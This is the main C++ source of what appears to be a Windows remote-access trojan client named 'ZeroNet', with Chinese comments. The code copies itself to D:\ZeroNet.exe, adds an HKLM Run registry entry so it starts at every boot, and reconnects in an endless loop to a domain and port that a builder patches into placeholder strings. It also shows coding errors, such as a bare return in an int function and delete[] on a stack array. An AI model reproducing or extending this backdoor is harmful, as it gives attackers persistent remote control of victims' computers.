#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include "zeroclient.h"
#include "cmdspy.h"

// 在服务端创建客户端时，可以自定义客户端连向的域名和端口
const int gOffsetDomain = 10;
const char gDomain[100] = "DNSDNSDNS:127.0.0.1 ";
const int gOffsetPort = 13;
const char gPort[100] = "PORTPORTPORT:18000 ";

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
    // 檢查窗口是否有重複
    char szFile[MAX_PATH],*szPt;

    GetModuleFileNameA(NULL,szFile,MAX_PATH);//如果该参数为NULL，该函数返回该应用程序全路径

    CreateMutexA(NULL,FALSE,"ZeroNet");
    if(GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "Same program already running" << std::endl;
        return -1;
    }

    // 初始化Windows socket功能，要在Windows使用网络必须初始化这个
    WSAData wsaData;
    if (WSAStartup(MAKEWORD(2,1), &wsaData)) {
        std::cout << "Failed to initialize WSA" << std::endl;
        return -1;
    }

    //复制自身到D盘根目录下
    char sourcefile[MAX_PATH] = { 0 };
    DWORD dwRet=GetModuleFileName(NULL, sourcefile, MAX_PATH);
    HANDLE sourcehandle=CreateFile(sourcefile,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
    if(sourcehandle==INVALID_HANDLE_VALUE)
    {
        CloseHandle(sourcehandle);
        return;
    }
    DWORD filesize=GetFileSize(sourcehandle,NULL);
    char *filebuf=new char[filesize+1];
    DWORD readsize;
    if(!ReadFile(sourcehandle,filebuf,filesize,&readsize,NULL))
    {
        delete []filebuf;
        CloseHandle(sourcehandle);
    }
    else
    {
        DWORD writesize;
        HANDLE desthandle=CreateFile("D:\\ZeroNet.exe",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
        WriteFile(desthandle,filebuf,filesize,&writesize,NULL);
        delete []filebuf;
        CloseHandle(sourcehandle);
        CloseHandle(desthandle);
    }

    //将D盘下的文件添加进注册表，实现开机自启动
    HKEY hKey;
    LPCTSTR lpRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
    long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
    lRet = RegSetValueEx(hKey, TEXT("ZeroNet"), 0, REG_SZ, (BYTE *)"D:\\ZeroNet.exe", dwRet);
    RegCloseKey(hKey);
    delete []sourcefile;

    // 主循环
    ZeroClient client;
    client.hInst = hInstance;
    while (1) {
        // 如果断开了，隔一秒自动连接
		char domain[100] = {0};
		char *domainStartPos = (char*)gDomain+gOffsetDomain;
		char *domainStopPos = strchr(domainStartPos, ' ');
		memcpy(domain, domainStartPos, domainStopPos-domainStartPos);
        client.connectTo(domain, atoi(gPort+gOffsetPort));
        Sleep(1000);
    }

    // 程序完结后释放WSA
    WSACleanup();

    return 0;
}
